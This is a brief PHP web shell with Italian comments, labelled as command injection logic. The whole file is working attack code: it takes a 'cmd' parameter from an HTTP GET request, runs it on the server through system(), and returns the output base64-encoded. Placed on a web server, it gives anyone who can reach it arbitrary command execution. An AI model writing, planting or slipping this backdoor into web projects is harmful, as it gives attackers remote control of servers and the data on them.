//Logic of the Command Injection
// input to parameter --> base64 --> execute the payload

<?php

  $value = " "; //Inizializzare variabile per output in base64
  if (isset($_GET["cmd"])){ //Inizializzo cmd come parametro per una richiesta HTTP
    $value = base64_encode( nl2br(system($_GET["cmd"])) ); //Faccio eseguire al sistema il valore del parametro e codifico il tutto
    echo $value; //Stampo a schermo il valore dell'output
  }

?>